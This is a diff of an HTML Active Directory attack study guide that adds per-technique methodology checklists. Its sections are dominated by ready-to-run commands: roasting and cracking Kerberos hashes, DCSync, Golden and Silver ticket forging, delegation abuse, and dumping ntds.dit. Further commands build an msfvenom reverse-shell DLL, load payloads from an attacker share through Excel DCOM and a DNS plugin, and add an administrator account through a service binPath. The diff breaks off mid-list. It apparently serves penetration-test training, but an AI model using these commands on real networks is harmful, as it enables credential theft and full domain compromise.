@@ -1547,6 +1547,14 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 <li>Offline brute-force the encryption to reveal the password.</li>
 </ul>
 
+<h3 id="cape-kerberos-enum-workflow">6.3.1 Baseline Kerberos Enumeration</h3>
+<p>Every Kerberos attack starts with a valid user list and a target DC. The per-attack methodology blocks below assume this baseline has been established.</p>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-enum-wf-0"> Build a user list with Kerbrute, RID brute, or LDAP.</li>
+<li><input type="checkbox" data-id="cape-kerberos-enum-wf-1"> Identify the DC (SPN <code>ldap/*</code>, <code>krbtgt</code> account, PDC role).</li>
+</ul>
+
 <h3 id="cape-kerberos-enumeration">6.4 Enumerating Usernames and Tickets</h3>
 <p>Discover valid users by brute-forcing a candidate list against the AS-REP flow. Kerbrute is the fastest:</p>
 <pre><code class="language-bash">python kerbrute.py -domain <domain.local> -dc <dc-ip> -t 100 -users <users.txt></code></pre>
@@ -1569,6 +1577,12 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 <p>Fetch AS-REPs for a list of users:</p>
 <pre><code class="language-bash">python3 GetNPUsers.py -dc-ip [ip] <domain.local>/ -usersfile [list-of-found-users-from-command-above]</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-asrep-wf-0"> Locate accounts with <code>DONT_REQ_PREAUTH</code> in <code>userAccountControl</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-asrep-wf-1"> Fetch AS-REPs with <code>GetNPUsers.py -format hashcat</code> and crack with <code>hashcat -m 18200</code>.</li>
+</ul>
+
 <h3 id="cape-kerberos-brute-force">6.7 Brute Forcing Usernames and Passwords</h3>
 <p>Combining userlist and password list against Kerberos AS-REQ, noisy but effective in labs and against permissive domains:</p>
 <pre><code class="language-bash">python kerbrute.py -domain <domain.local> -users users.txt -passwords passwords.txt -outputfile passwords-found.txt</code></pre>
@@ -1576,6 +1590,12 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 <h3 id="cape-kerberos-roasting-cred">6.8 Kerberoasting with Cracked Credentials</h3>
 <p>Kerberoasting escalates via cracked service accounts. Any authenticated user can request a TGS for any SPN, the crackability of the returned hash depends on the strength of the service password:</p>
 <pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip <dc-ip> '<domain.local>/<user>:<password>' -outputfile kerberoasting_hashes.txt</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-roast-wf-0"> Enumerate user accounts with a populated <code>servicePrincipalName</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-roast-wf-1"> Request TGS with <code>GetUserSPNs.py -outputfile</code>, then crack with <code>hashcat -m 13100</code>.</li>
+</ul>
 
 <h3 id="cape-kerberos-tgt-bruteforce">6.9 Brute Forcing a User Hash via TGT Retrieval</h3>
 <p>Given a list of users and NTLM hashes with unclear pairing, iterate every combination through <code>getTGT.py</code>, a valid pair returns a TGT:</p>
@@ -1625,6 +1645,13 @@ done</code></pre>
 <p>Verify by dropping into the DC's ADMIN share:</p>
 <pre><code class="language-bash">dir \\<dc-fqdn>\c$\</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-golden-wf-0"> DCSync KRBTGT: <code>lsadump::dcsync /user:krbtgt</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-golden-wf-1"> Forge and inject: <code>kerberos::golden /admin:... /sid:&lt;domain-sid&gt; /krbtgt:&lt;hash&gt; /id:500 /ptt</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-golden-wf-2"> Verify with <code>dir \\&lt;dc&gt;\c$</code> from the current session.</li>
+</ul>
+
 <h3 id="cape-kerberos-silver-tickets">6.11 Silver Tickets</h3>
 <p>Silver Tickets are forged TGSs signed with the service account's key. They are harder to detect because the DC is never contacted, and harder to defend against because rotating every machine account password on a schedule is operationally painful.</p>
 <p style="text-align:center;"><img src="./img/cape/unpac-the-hash-flow.png" alt="UnPAC-the-Hash flow extracting an NTLM hash from a PKINIT PAC" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
@@ -1650,6 +1677,12 @@ done</code></pre>
 <p>Verify with a UNC path against SERVER1:</p>
 <pre><code class="language-bash">dir \\<target-fqdn>\c$\</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-silver-wf-0"> Recover the target machine account's NTLM hash (LSASS dump, DCSync, or reused local admin).</li>
+<li><input type="checkbox" data-id="cape-kerberos-silver-wf-1"> Forge with <code>kerberos::golden /target:&lt;host&gt; /rc4:&lt;machine-hash&gt; /service:cifs /ptt</code>.</li>
+</ul>
+
 <h3 id="cape-kerberos-optkh">6.12 Overpass-the-Hash</h3>
 <p>Kerberos derives its long-term key from the account password. For RC4-HMAC that key is identical to the NTLM hash, and for AES it is a PBKDF2 derivation of the password. Possession of the hash is therefore equivalent to possession of the password for the AS-REQ step. Overpass-the-Hash turns a Pass-the-Hash credential into a full Kerberos foothold by requesting a TGT rather than performing an NTLM handshake.</p>
 <p>Rubeus asktgt with the RC4 key:</p>
@@ -1662,6 +1695,13 @@ export KRB5CCNAME=&lt;user&gt;.ccache
 smbclient.py -k &lt;domain.local&gt;/&lt;user&gt;@&lt;target-fqdn&gt;</code></pre>
 <p>AES key variant, which many hardened domains prefer over RC4:</p>
 <pre><code class="language-bash">Rubeus.exe asktgt /user:&lt;user&gt; /aes256:&lt;aes256-key&gt; /domain:&lt;domain.local&gt; /dc:&lt;dc-fqdn&gt; /ptt</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-0"> Recover the NTLM hash (LSASS dump, DCSync, LAPS, cached credentials).</li>
+<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-1"> Request a TGT with <code>Rubeus asktgt /rc4:&lt;hash&gt; /ptt</code> or <code>getTGT.py -hashes :&lt;hash&gt;</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-2"> Prefer <code>/aes256:</code> in hardened domains that disable RC4 pre-auth.</li>
+</ul>
 
 <h3 id="cape-kerberos-unconstrained-chain">6.13 Unconstrained Delegation Attack Chain</h3>
 <p>Unconstrained delegation on a host means every user who authenticates to it forwards their own TGT for the host to store locally. A compromised host with unconstrained delegation becomes a TGT collector. Coerce a Domain Controller (or any high-value account) to authenticate to that host and its TGT lands in LSASS.</p>
@@ -1685,6 +1725,14 @@ python3 dfscoerce.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt
 # Verify and DCSync
 klist
 mimikatz # lsadump::dcsync /domain:&lt;domain.local&gt; /user:krbtgt</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-0"> Enumerate hosts with <code>TRUSTED_FOR_DELEGATION</code> via PowerView or LDAP.</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-1"> On the compromised UD host, run <code>Rubeus monitor /filteruser:&lt;target&gt;$</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-2"> Coerce the target with SpoolSample, PetitPotam, or DFSCoerce.</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-3"> Inject the captured TGT with <code>Rubeus ptt</code>, then DCSync.</li>
+</ul>
 
 <h3 id="cape-kerberos-constrained">6.14 Constrained Delegation (S4U2Self / S4U2Proxy)</h3>
 <p>Constrained delegation allows a service account to impersonate users, but only to the specific SPNs listed in <code>msDS-AllowedToDelegateTo</code>. The abuse chain runs two Kerberos service-for-user extensions in sequence:</p>
@@ -1710,6 +1758,13 @@ smbclient.py -k &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</code></p
 <p>Rubeus one-shot with alternate service names:</p>
 <pre><code class="language-bash">Rubeus.exe s4u /user:&lt;service-user&gt; /rc4:&lt;ntlm-hash&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;target-fqdn&gt; /altservice:cifs,host,http /ptt</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-0"> Enumerate accounts with a populated <code>msDS-AllowedToDelegateTo</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-1"> Compromise the source service account, get a TGT (<code>getTGT.py</code>).</li>
+<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-2"> Chain S4U2Self and S4U2Proxy with <code>getST.py -impersonate administrator</code> or <code>Rubeus s4u</code>.</li>
+</ul>
+
 <h3 id="cape-kerberos-rbcd">6.15 Resource-Based Constrained Delegation</h3>
 <p>Resource-Based Constrained Delegation (RBCD) inverts the classical model. Instead of the source listing where it may delegate to, the target lists who may act on its behalf via <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. Write access to a computer object's SD is enough to configure RBCD onto it, and any authenticated user can create a new computer account by default (the MachineAccountQuota is 10).</p>
 <p>The attack chain requires a source computer account you fully control (created for the purpose):</p>
@@ -1731,6 +1786,15 @@ psexec.py -k -no-pass &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</co
 <p>Cleanup, remove RBCD when finished so the delegation attribute does not stay in place:</p>
 <pre><code class="language-bash">python3 rbcd.py -delegate-to &lt;target-computer&gt;$ -dc-ip &lt;dc-ip&gt; &lt;domain.local&gt;/&lt;user&gt;:'&lt;password&gt;' -action flush</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-0"> Confirm write access on the target computer's SD (or that MachineAccountQuota is non-zero).</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-1"> Create a controlled computer account with <code>addcomputer.py</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-2"> Write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target with <code>rbcd.py -action write</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-3"> S4U as the created computer with <code>getST.py -impersonate administrator</code>, then use the ticket.</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-4"> Flush the delegation attribute when finished.</li>
+</ul>
+
 <h3 id="cape-kerberos-unpac">6.16 UnPAC-the-Hash</h3>
 <p>When a certificate is used to authenticate via PKINIT, the resulting TGT contains a Privilege Attribute Certificate (PAC). One of its structures, <code>PAC_CREDENTIAL_INFO</code>, carries the user's NTLM hash. Pulling that hash out of the PAC gives you the account's NTLM without ever completing an NTLM handshake on the wire.</p>
 <p style="text-align:center;"><img src="./img/cape/unpac-the-hash-flow.png" alt="UnPAC-the-Hash flow extracting NTLM from a PKINIT PAC" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
@@ -1745,65 +1809,34 @@ psexec.py -k -no-pass &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</co
 <pre><code class="language-bash">Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;pfx-base64&gt; /password:'&lt;pfx-password&gt;' /getcredentials /show</code></pre>
 <p>The extracted hash feeds directly into PtH, Overpass-the-Hash, or DCSync.</p>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-unpac-wf-0"> After any ADCS primitive that yields a PFX, run <code>certipy auth -pfx &lt;user&gt;.pfx</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-unpac-wf-1"> Alternate: <code>Rubeus asktgt /certificate:&lt;pfx&gt; /getcredentials</code> to pull the NTLM out of the PAC.</li>
+</ul>
+
 <h3 id="cape-kerberos-ntds-cracking">6.17 Cracking ntds.dit and Registry Hives</h3>
 <p>Once the ntds.dit and SYSTEM hive are exfiltrated, Impacket's secretsdump extracts every hash:</p>
 <pre><code class="language-bash">python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL &gt; backup_ad_dump</code></pre>
 <p>With explicit hashes for authentication in edge cases:</p>
 <pre><code class="language-bash">python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit -hashes lmhash:nthash LOCAL -output hashes-output</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-kerberos-ntds-wf-0"> Exfiltrate <code>ntds.dit</code> and the SYSTEM registry hive (VSS, ntdsutil, or file copy on backups).</li>
+<li><input type="checkbox" data-id="cape-kerberos-ntds-wf-1"> Run <code>secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL</code> and crack with <code>hashcat -m 1000</code>.</li>
+</ul>
+
 <h3 id="cape-kerberos-ldap-passback">6.18 LDAP Pass-back Attack</h3>
 <p>LDAP authentication resembles NTLM but the application validates credentials directly, the app holds an AD service account, queries LDAP, then verifies the user's password. Services commonly using LDAP: GitLab, Jenkins, custom web apps, network printers, VPN portals.</p>
 <p>If you can read the app's config (via a foothold or default admin creds like <code>admin:admin</code>), the LDAP creds may be plaintext. If the password is masked, change the LDAP server IP in the app config to point at your box and test the connection, the app will attempt authentication against your rogue LDAP server, letting you capture the credential.</p>
 
-<h3 id="cape-kerberos-methodology">6.19 Methodology</h3>
+<h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-0"> Enumerate users via Kerbrute, RID-brute, or LDAP.
-<pre><code class="language-bash">python kerbrute.py -domain <domain.local> -dc &lt;dc&gt; -t 100 -users users.txt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-1"> Attempt AS-REP Roasting, pre-auth-disabled accounts leak roastable hashes immediately.
-<pre><code class="language-bash">python3 GetNPUsers.py -dc-ip &lt;dc&gt; domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
-hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-2"> Enumerate SPNs and Kerberoast weak service accounts.
-<pre><code class="language-bash">python3 GetUserSPNs.py -dc-ip &lt;dc&gt; domain.local/user:pass -outputfile spns.hash
-hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-3"> If you gain DA, dump KRBTGT via DCSync and forge Golden Tickets for persistence.
-<pre><code class="language-bash">mimikatz # lsadump::dcsync /domain:<domain.local> /user:krbtgt
-mimikatz # kerberos::golden /admin:pass /domain:<domain.local> /id:500 /sid:&lt;SID&gt; /krbtgt:&lt;hash&gt; /endin:600 /renewmax:10080 /ptt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-4"> For a specific service, forge Silver Tickets, quieter than Golden.
-<pre><code class="language-bash">mimikatz # kerberos::golden /admin:pass /domain:<domain.local> /id:500 /sid:&lt;SID&gt; /target:<target-server> /rc4:&lt;machine-hash&gt; /service:cifs /ptt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-4a"> Overpass-the-Hash, convert an NTLM hash or AES key into a TGT.
-<pre><code class="language-bash">Rubeus.exe asktgt /user:&lt;user&gt; /rc4:&lt;ntlm-hash&gt; /domain:&lt;domain.local&gt; /dc:&lt;dc-fqdn&gt; /ptt
-getTGT.py -hashes :&lt;ntlm-hash&gt; &lt;domain.local&gt;/&lt;user&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-4b"> Unconstrained delegation, monitor with Rubeus on the delegating host, coerce the target, DCSync from the captured TGT.
-<pre><code class="language-bash">Rubeus.exe monitor /interval:5 /filteruser:&lt;target-dc&gt;$
-SpoolSample.exe &lt;target-dc&gt;.&lt;domain.local&gt; &lt;ud-host&gt;.&lt;domain.local&gt;
-Rubeus.exe ptt /ticket:&lt;base64-ticket&gt;
-mimikatz # lsadump::dcsync /domain:&lt;domain.local&gt; /user:krbtgt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-4c"> Constrained delegation, chain S4U2Self + S4U2Proxy to impersonate any user to an allowed SPN.
-<pre><code class="language-bash">getTGT.py &lt;domain.local&gt;/&lt;service-user&gt;:'&lt;password&gt;'
-getST.py -spn cifs/&lt;target-fqdn&gt; -impersonate administrator &lt;domain.local&gt;/&lt;service-user&gt;:'&lt;password&gt;'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-4d"> RBCD, create a computer, write msDS-AllowedToActOnBehalfOfOtherIdentity on the target, S4U as the created computer.
-<pre><code class="language-bash">python3 addcomputer.py -computer-name FAKE01$ -computer-pass '&lt;password&gt;' -dc-ip &lt;dc-ip&gt; &lt;domain.local&gt;/&lt;user&gt;:'&lt;password&gt;'
-python3 rbcd.py -delegate-from FAKE01$ -delegate-to &lt;target-computer&gt;$ -dc-ip &lt;dc-ip&gt; &lt;domain.local&gt;/&lt;user&gt;:'&lt;password&gt;' -action write
-python3 getST.py -spn cifs/&lt;target-fqdn&gt; -impersonate administrator &lt;domain.local&gt;/FAKE01$:'&lt;password&gt;'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-4e"> UnPAC-the-Hash, after any PKINIT auth, pull the NTLM hash out of the PAC and pivot to PtH.
-<pre><code class="language-bash">certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;
-Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;pfx-base64&gt; /password:'&lt;pfx-password&gt;' /getcredentials /show</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-5"> Extract ntds.dit and crack every user hash offline.
-<pre><code class="language-bash">python secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL &gt; hashes.txt
-hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-kerberos-methodology-wf-6"> Keep an eye on LDAP-authenticating apps, a config read is often faster than any of the above.</li>
+<li><input type="checkbox" data-id="cape-kerberos-passback-wf-0"> Access the app's admin/config UI (default creds, foothold, or session hijack).</li>
+<li><input type="checkbox" data-id="cape-kerberos-passback-wf-1"> Point the LDAP server field at your listener, trigger the connection test, capture the credential.</li>
 </ul>
+
 <h2 id="cape-dacl-1-7">7. DACL Attacks I</h2>
 <p>DACLs are the ACL layer on every Active Directory object. Each entry says what a specific principal is allowed or denied to do to that object, and misconfigured entries are the single most common escalation path I see on mature engagements. A legitimate delegation like "helpdesk can reset user passwords" often reaches further than the person who wrote it intended, and that gap is exactly what BloodHound's edges surface at a glance. GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMembers, and AllExtendedRights each map to a specific set of primitives, and each shows up on real domains often enough to be worth memorising.</p>
 <p style="text-align:center;"><img src="./img/cape/dacl-ace-permissions.png" alt="Windows security editor showing DACL ACE permissions on an AD object" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
@@ -1890,6 +1923,13 @@ $obj = [System.Activator]::CreateInstance($com)
 $obj.DisplayAlerts = $false
 $obj.Workbooks.Open('\\attacker\share\payload.xls')</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-0"> Confirm local admin on the source workstation and that <code>Excel.Application</code> is reachable via DCOM on the target.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-1"> Drop a macro-enabled XLS with an AutoOpen payload on a share the target can read.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-2"> Trigger the remote workbook open via <code>Workbooks.Open</code> against the DCOM Excel object.</li>
+</ul>
+
 <h3 id="cape-dacl2-dcsync">8.2 Performing DCSync</h3>
 <p>DCSync abuses the replication protocol between DCs, an attacker with <strong>DS-Replication-Get-Changes</strong> and <strong>DS-Replication-Get-Changes-All</strong> can request account secrets exactly as another DC would. No code runs on the target DC, so process-level detection misses it.</p>
 
@@ -1915,6 +1955,13 @@ mimikatz # lsadump::dcsync /domain:<domain.local> /user:krbtgt</code></pre>
 <h4 id="cape-dacl2-dcsync-automated">8.2.5 Automated</h4>
 <p>Many C2 frameworks wrap DCSync as a one-liner:</p>
 <pre><code class="language-bash">nxc smb &lt;DC&gt; -u &lt;user&gt; -p &lt;pass&gt; --ntds</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-0"> Verify the current principal holds <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> (BloodHound edge <code>GetChanges</code> and <code>GetChangesAll</code>).</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-1"> Dump every account with <code>secretsdump.py -just-dc-ntlm</code>, or pull a single account with <code>lsadump::dcsync /user:</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-2"> Grab KRBTGT for Golden Ticket persistence when Domain Admin is in scope.</li>
+</ul>
 
 <h3 id="cape-dacl2-sebackup">8.3 Exploiting SeBackupPrivilege</h3>
 <p>SeBackupPrivilege allows any file to be read, bypassing DACLs, designed for backup software. On a DC, that includes the SAM, SYSTEM, and ntds.dit hives.</p>
@@ -1943,21 +1990,47 @@ reg.exe save hklm\system C:\temp\SYSTEM</code></pre>
 <p>Process offline with secretsdump:</p>
 <pre><code class="language-bash">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-0"> Verify <code>SeBackupPrivilege</code> is present and enabled with <code>whoami /priv</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-1"> Snapshot the volume via diskshadow, or export SAM / SECURITY / SYSTEM with <code>reg save</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-2"> Process <code>ntds.dit</code> or the SAM hive offline with <code>secretsdump.py LOCAL</code>.</li>
+</ul>
+
 <h3 id="cape-dacl2-semanagevolume">8.4 Exploiting SeManageVolumePrivilege</h3>
 <p>SeManageVolumePrivilege grants full control over any file, the design allowed disk defragmentation tools to run without admin, but the effective outcome is trivial privilege escalation. Grant your account write access to a SYSTEM-writable directory, drop a malicious DLL, and let a signed binary side-load it.</p>
 <pre><code class="language-bash">.\SeManageVolumeExploit.exe</code></pre>
 <p>After execution, arbitrary writes to C:\Windows succeed. Generate a malicious payload:</p>
 <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f dll -o payload.dll</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-semanagevolume-wf-0"> Confirm <code>SeManageVolumePrivilege</code> is present with <code>whoami /priv</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-semanagevolume-wf-1"> Run <code>SeManageVolumeExploit.exe</code> to gain arbitrary write on <code>C:\Windows</code>, then drop a DLL a signed binary side-loads.</li>
+</ul>
+
 <h3 id="cape-dacl2-pac">8.5 Exploiting PAC in Kerberos (MS14-068)</h3>
 <p>MS14-068 lets a non-privileged user forge a Golden Ticket via a corrupt PAC. It works when PAC validation is enabled and the DC is unpatched. Historical significance is high; still occasionally seen on unmanaged domain controllers.</p>
 <pre><code class="language-bash">python goldenPac.py domain.local/user:password@dc.domain.local</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-pac-wf-0"> Check the DC patch level; MS14-068 pre-dates the KB2992611 fix.</li>
+<li><input type="checkbox" data-id="cape-dacl2-pac-wf-1"> Run <code>goldenPac.py</code> against the DC with any authenticated user's credentials.</li>
+</ul>
 
 <h3 id="cape-dacl2-server-operators">8.6 Exploiting Server Operators Group</h3>
 <p>Members of Server Operators can start and stop services on DCs. Find a service running as SYSTEM whose binPath can be modified:</p>
 <pre><code class="language-bash">sc.exe qc &lt;service_name&gt;
 sc.exe config &lt;service_name&gt; binPath= "cmd.exe /c net user attacker <password> /add &amp;&amp; net localgroup administrators attacker /add"
 sc.exe start &lt;service_name&gt;</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-0"> Verify Server Operators membership on the current user (or a foothold account).</li>
+<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-1"> Locate a SYSTEM-running service on the DC whose <code>binPath</code> you can modify with <code>sc.exe config</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-2"> Set the <code>binPath</code> to your payload, start the service, then restore the original config.</li>
+</ul>
 
 <h3 id="cape-dacl2-dnsadmin">8.7 Exploiting DNS Admin Group</h3>
 <p>DNSAdmins can configure the DNS service, which runs on the DC as SYSTEM. Load a malicious DLL as a DNS plugin and restart the service, code executes as SYSTEM on the DC.</p>
@@ -1967,6 +2040,13 @@ sc.exe start &lt;service_name&gt;</code></pre>
 <pre><code class="language-bash">dnscmd &lt;dc&gt; /config /serverlevelplugindll \\attacker\share\adduser.dll
 sc.exe \\&lt;dc&gt; stop dns
 sc.exe \\&lt;dc&gt; start dns</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-0"> Verify DNSAdmins membership.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-1"> Compile a DLL that runs your payload from <code>DllMain</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-2"> Register with <code>dnscmd /config /serverlevelplugindll</code>, then restart the DNS service to trigger load as SYSTEM.</li>
+</ul>
 
 <h3 id="cape-dacl2-seimpersonate">8.8 Exploiting SeImpersonatePrivilege (Potato Family)</h3>
 <p>SeImpersonatePrivilege is what almost every Windows service account holds by default so it can impersonate clients that connect to it. On its own it is limited, but combined with a coercion primitive it becomes a full SYSTEM escalation. The pattern is the same across the whole Potato family: coerce a privileged NTLM authentication into a local server, use the token that lands on the pipe, and impersonate it.</p>
@@ -1991,6 +2071,13 @@ PrintSpoofer64.exe -c "&lt;payload&gt;.exe"</code></pre>
 <pre><code class="language-bash">GodPotato-NET4.exe -cmd "cmd /c whoami"
 GodPotato-NET4.exe -cmd "cmd /c &lt;payload&gt;.exe"</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-0"> Confirm <code>SeImpersonatePrivilege</code> with <code>whoami /priv | findstr SeImpersonate</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-1"> Pick the variant that matches the OS: PrintSpoofer where Spooler is up, GodPotato on modern Windows 11, RoguePotato when the local resolver is locked down.</li>
+<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-2"> Run the variant with <code>-c "&lt;payload&gt;"</code> to land as SYSTEM.</li>
+</ul>
+
 <h3 id="cape-dacl2-laps">8.9 Reading LAPS Passwords</h3>
 <p>The Local Administrator Password Solution (LAPS) rotates the local Administrator password on each domain-joined host and stores the current value in the computer object as <code>ms-Mcs-AdmPwd</code> (legacy) or <code>msLAPS-Password</code> (Windows LAPS). Any principal with read access to that attribute can decrypt it (Windows LAPS uses ACL-based read protection; the older Microsoft LAPS relied purely on the attribute ACL).</p>
 <p>Enumerate who can read LAPS on which computer objects:</p>
@@ -2011,6 +2098,12 @@ Get-LapsADPassword -Identity &lt;computer&gt; -AsPlainText</code></pre>
 netexec ldap &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' -M laps
 bloodyAD --host &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain.local&gt; get object &lt;computer&gt;$ --attr ms-Mcs-AdmPwd</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-laps-wf-0"> Enumerate which principals hold <em>All Extended Rights</em> or explicit read on <code>ms-Mcs-AdmPwd</code> / <code>msLAPS-Password</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-laps-wf-1"> Read the current value with <code>Get-LapsADPassword</code>, <code>Get-ADComputer -Properties ms-Mcs-AdmPwd</code>, or <code>netexec -M laps</code>.</li>
+</ul>
+
 <h3 id="cape-dacl2-dcom-lateral">8.10 DCOM Lateral Movement Objects</h3>
 <p>Beyond the macro-driven Excel path, DCOM exposes several objects whose methods launch arbitrary commands remotely, driven from PowerShell. Each requires local admin on the target and DCOM reachable on port 135/tcp plus the dynamic RPC range.</p>
 <p><strong>MMC20.Application</strong>, the <code>Document.ActiveView.ExecuteShellCommand</code> method runs an arbitrary command:</p>
@@ -2027,6 +2120,13 @@ $item.Document.Application.ShellExecute('cmd.exe', '/c &lt;payload&gt;', 'C:\', 
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Document.Application.ShellExecute('cmd.exe', '/c &lt;payload&gt;', 'C:\', $null, 0)</code></pre>
 <p>These are quieter than psexec because no service is created and no binary is dropped to disk.</p>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-0"> Confirm local admin on the target and that DCOM (135/tcp + dynamic RPC) is reachable.</li>
